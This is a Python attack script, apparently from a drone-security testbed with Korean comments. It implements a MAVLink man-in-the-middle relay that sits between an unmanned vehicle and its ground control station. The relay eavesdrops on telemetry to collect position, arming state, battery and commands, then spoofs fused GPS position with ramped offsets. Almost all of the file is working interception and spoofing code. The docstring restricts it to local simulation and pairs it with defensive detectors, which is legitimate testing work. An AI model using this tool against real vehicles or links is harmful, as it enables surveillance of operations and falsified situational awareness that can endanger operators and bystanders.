"""
공격 #5 — 데이터링크 MITM 인터셉션 (수동 도청 → 능동 변조)

위협모델
--------
STRIDE : Information Disclosure(도청) + Tampering(텔레메트리 변조)
TARA   : 기밀성 상실(임무·위치·상태 노출) + 상황인식 오염(위조 피드백)
STPA-Sec: 위조된 피드백에 기반한 불안전 제어행동
MITRE ATT&CK ICS: Adversary-in-the-Middle(T0830), Spoof Reporting Message(T0856)

원리
----
데이터링크/전술망은 UxS(UAV/UGV)와 GCS/UCS 사이의 전송 계층이다. 공격자가 이 경로에
중간자(MITM)로 삽입되면(예: 무선 릴레이 하이재킹, 악성 게이트웨이, ARP/경로 오염),
UxS→GCS 다운링크(텔레메트리·센서·Health)와 GCS→UxS 업링크(명령)를 모두 가로챌 수 있다.

본 도구는 이를 프로토콜 수준에서 정직하게 모델링한다. 인터셉터는 UDP 릴레이로서
차량의 텔레메트리 포트와 GCS(방어 에이전트) 사이에 삽입되어 두 단계로 동작한다.

  [1단계 · 수동 도청]  모든 MAVLink 프레임을 바이트 단위로 그대로 중계(투명)하면서
    복호·파싱해 위치·비행모드·배터리·무장상태·명령이력을 탈취한다. 프레임을 조작하지
    않으므로 텔레메트리 '내용'상 서명이 없다 — 도청은 본질적으로 은밀하다(정직한 한계).
    이 단계의 피해는 순수 기밀성 상실이다.

  [2단계 · 능동 변조]  공격자가 방어를 무력화하거나 상황인식을 오염시키려는 순간,
    은밀성은 깨진다. 인터셉터가 GLOBAL_POSITION_INT(운용자가 신뢰하는 융합 위치)의
    좌표에 점증 오프셋을 주입하되 속도 필드(vx,vy)는 건드리지 않는다. 그 결과
      (a) 위치 변화량이 보고된 속도와 불일치(운동학 정합성 위반),
      (b) 재기록된 프레임이 새 MAVLink 시퀀스로 방출되어 발신원 시퀀스 불연속,
      (c) 위조된 융합위치 vs 참(true) 원시 GPS 간 divergence
    라는 세 가지 공통 서명이 GCS 관측 텔레메트리에 나타난다.

방어 관점(defense.detectors.InterceptionMonitor + GnssInsCrossCheck)은 특정 링크 암호화나
오토파일럿 구현에 의존하지 않고 이 공통 서명만으로 능동 변조를 탐지한다.

주의: 격리된 로컬 시뮬레이션 전용. 실제 기체/무선/네트워크에 사용 금지.

사용:
    # 인터셉터를 차량(14550)과 방어(14551) 사이에 삽입, 6초 후 능동 변조로 전환
    python -m attacks.mitm_intercept \
        --listen udpin:127.0.0.1:14550 --forward udpout:127.0.0.1:14551 \
        --activate-after 6 --duration 14 --drift-m 120
"""
from __future__ import annotations

import argparse
import json
import math
import os
import time

from pymavlink import mavutil
from pymavlink.dialects.v20 import common as mav

EARTH_R = 6378137.0

MODE_NAMES = {3: "AUTO", 4: "GUIDED", 5: "LOITER", 6: "RTL", 0: "MANUAL"}


def meters_to_latlon(dnorth_m, deast_m, lat0):
    dlat = dnorth_m / EARTH_R * (180.0 / math.pi)
    dlon = deast_m / (EARTH_R * math.cos(math.radians(lat0))) * (180.0 / math.pi)
    return dlat, dlon


class Interceptor:
    """UxS↔GCS 다운링크에 삽입되는 중간자(MITM) 릴레이."""

    def __init__(self, listen, forward, activate_after, duration,
                 drift_m, bearing_deg, tamper_ramp_s=2.5, evidence_dir="logs_mitm"):
        # rx: 차량이 보내는 텔레메트리를 받는 소켓(원래 GCS가 듣던 포트)
        self.rx = mavutil.mavlink_connection(listen)
        # tx: 진짜 GCS/방어로 다시 내보내는 소켓
        self.tx = mavutil.mavlink_connection(forward, source_system=1)

        self.activate_after = activate_after
        self.duration = duration
        self.drift_m = drift_m
        self.bearing = bearing_deg
        self.tamper_ramp_s = tamper_ramp_s

        os.makedirs(evidence_dir, exist_ok=True)
        self.capture_path = os.path.join(evidence_dir, "capture.jsonl")
        self.harvest_path = os.path.join(evidence_dir, "harvest.json")
        self._cap = open(self.capture_path, "w")

        # 탈취(수집) 정보 — 도청만으로 재구성되는 운용 상황도
        self.intel = {
            "sysid": None, "vehicle_type": None, "autopilot": None,
            "armed": None, "mode": None, "battery_pct": None,
            "home": None, "last_pos": None, "sats": None,
            "track": [],                 # 위치 궤적 샘플
            "commands": [],              # 관측된 명령/ACK
            "msg_counts": {},            # 메시지 타입별 카운트
        }
        self.frames = 0
        self.pos_frames = 0
        self.tampered = 0

    # ---------- 도청: 프레임에서 정보 추출 ----------
    def harvest(self, msg):
        t = msg.get_type()
        self.intel["msg_counts"][t] = self.intel["msg_counts"].get(t, 0) + 1
        self.intel["sysid"] = msg.get_srcSystem()

        if t == "HEARTBEAT":
            self.intel["autopilot"] = int(msg.autopilot)
            self.intel["vehicle_type"] = int(msg.type)
            self.intel["armed"] = bool(msg.base_mode & mav.MAV_MODE_FLAG_SAFETY_ARMED)
            self.intel["mode"] = MODE_NAMES.get(msg.custom_mode, f"CUSTOM({msg.custom_mode})")
        elif t == "GLOBAL_POSITION_INT":
            lat, lon = msg.lat / 1e7, msg.lon / 1e7
            self.intel["last_pos"] = [round(lat, 7), round(lon, 7), msg.alt / 1000.0]
            if self.intel["home"] is None:
                self.intel["home"] = [round(lat, 7), round(lon, 7)]
            self.pos_frames += 1
            if self.pos_frames % 4 == 1:
                self.intel["track"].append([round(lat, 7), round(lon, 7)])
        elif t == "GPS_RAW_INT":
            self.intel["sats"] = int(msg.satellites_visible)
        elif t == "SYS_STATUS":
            self.intel["battery_pct"] = int(msg.battery_remaining)
        elif t == "COMMAND_ACK":
            self.intel["commands"].append({"ack_cmd": int(msg.command), "result": int(msg.result)})

        self._cap.write(json.dumps({
            "t": round(time.time(), 3), "type": t, "sys": msg.get_srcSystem(),
            "seq": msg.get_seq(),
        }) + "\n")

    # ---------- 능동 변조: 융합 위치에 오프셋 주입 ----------
    def tamper(self, msg, active_frac):
        """GLOBAL_POSITION_INT 좌표를 밀어내되 vx,vy는 유지 → 운동학 불일치 유발.

        차량이 실제로 보고한 프레임을 재기록해 방출한다(속도 필드 불변). 재기록
        프레임은 인터셉터의 새 시퀀스로 나가므로 발신원 시퀀스도 불연속이 된다.
        """
        off = self.drift_m * active_frac
        dn = off * math.cos(math.radians(self.bearing))
        de = off * math.sin(math.radians(self.bearing))
        dlat, dlon = meters_to_latlon(dn, de, msg.lat / 1e7)
        self.tx.mav.global_position_int_send(
            msg.time_boot_ms,
            msg.lat + int(dlat * 1e7), msg.lon + int(dlon * 1e7),
            msg.alt, msg.relative_alt,
            msg.vx, msg.vy, msg.vz, msg.hdg)   # 속도·헤딩 그대로 → 위치만 위조
        self.tampered += 1

    # ---------- 메인 릴레이 루프 ----------
    def run(self):
        print(f"[mitm] 인터셉터 삽입: rx={self.rx.address if hasattr(self.rx,'address') else self.rx}"
              f" → tx(GCS)")
        print(f"[mitm] 1단계 수동 도청 시작 (능동 변조까지 {self.activate_after:.0f}s)")
        t0 = time.time()
        announced_active = False
        while True:
            now = time.time() - t0
            if now > self.duration:
                break
            msg = self.rx.recv_match(blocking=True, timeout=0.5)
            if msg is None:
                continue
            if msg.get_type() == "BAD_DATA":
                continue
            self.frames += 1
            self.harvest(msg)

            active = now >= self.activate_after
            if active and not announced_active:
                print(f"[mitm] ── 2단계 능동 변조 전환 (t={now:.1f}s): "
                      f"융합위치에 {self.drift_m:.0f}m 오프셋 주입 개시 ──")
                announced_active = True

            if active and msg.get_type() == "GLOBAL_POSITION_INT":
                # 빠른 램프(tamper_ramp_s 내 전량 변위) 후 유지 → 램프 구간에서
                # 프레임 간 위치 점프가 보고 속도를 크게 초과(운동학 위반), 이후 유지
                # 구간은 위조 융합위치 vs 참 GPS divergence로 지속 관측된다.
                frac = min(1.0, (now - self.activate_after) / max(1e-3, self.tamper_ramp_s))
                self.tamper(msg, frac)
            else:
                # 그 외 프레임은 바이트 그대로 중계(투명) — seq 보존
                self.tx.write(msg.get_msgbuf())

        self._finish()

    def _finish(self):
        self._cap.close()
        with open(self.harvest_path, "w") as fh:
            json.dump({**self.intel, "frames_relayed": self.frames,
                       "frames_tampered": self.tampered}, fh, ensure_ascii=False, indent=2)
        self._report()

    def _report(self):
        i = self.intel
        vt = i["vehicle_type"]
        vt_name = ("멀티로터(UAV)" if vt == mav.MAV_TYPE_QUADROTOR
                   else "지상차량(UGV)" if vt == mav.MAV_TYPE_GROUND_ROVER else str(vt))
        print("\n" + "=" * 62)
        print("  MITM 도청 리포트 — 링크 암호화 없이 재구성한 운용 상황도")
        print("=" * 62)
        print(f"  대상 시스템 ID   : {i['sysid']}  ({vt_name})")
        print(f"  무장 상태        : {'ARMED' if i['armed'] else 'DISARMED'}")
        print(f"  비행/운용 모드   : {i['mode']}")
        print(f"  배터리 잔량      : {i['battery_pct']}%")
        print(f"  가시위성 수      : {i['sats']}")
        print(f"  추정 홈 좌표     : {i['home']}")
        print(f"  최종 위치        : {i['last_pos']}")
        print(f"  탈취 궤적 샘플   : {len(i['track'])}개 지점")
        print(f"  관측 명령/ACK    : {len(i['commands'])}건")
        print(f"  중계 프레임      : {self.frames}  (변조 {self.tampered})")
        print(f"  메시지 유형      : {i['msg_counts']}")
        print("=" * 62)
        print(f"  → 전량 저장: {self.capture_path} / {self.harvest_path}")


def main():
    ap = argparse.ArgumentParser(description="데이터링크 MITM 인터셉션(도청→변조)")
    ap.add_argument("--listen", default="udpin:127.0.0.1:14550",
                    help="차량 텔레메트리를 받는 포트(원래 GCS가 듣던 포트)")
    ap.add_argument("--forward", default="udpout:127.0.0.1:14551",
                    help="진짜 GCS/방어로 재전송할 포트")
    ap.add_argument("--activate-after", type=float, default=6.0,
                    help="수동 도청 유지 시간(s) 이후 능동 변조 전환")
    ap.add_argument("--duration", type=float, default=14.0, help="총 동작 시간(s)")
    ap.add_argument("--drift-m", type=float, default=120.0, help="최종 위치 위조 오프셋(m)")
    ap.add_argument("--bearing-deg", type=float, default=90.0, help="위조 방향(0=북,90=동)")
    ap.add_argument("--tamper-ramp-s", type=float, default=2.5,
                    help="위조 오프셋을 전량 밀어내는 램프 시간(s), 이후 유지")
    ap.add_argument("--evidence-dir", default="logs_mitm")
    args = ap.parse_args()

    Interceptor(args.listen, args.forward, args.activate_after, args.duration,
                args.drift_m, args.bearing_deg, args.tamper_ramp_s,
                args.evidence_dir).run()


if __name__ == "__main__":
    main()
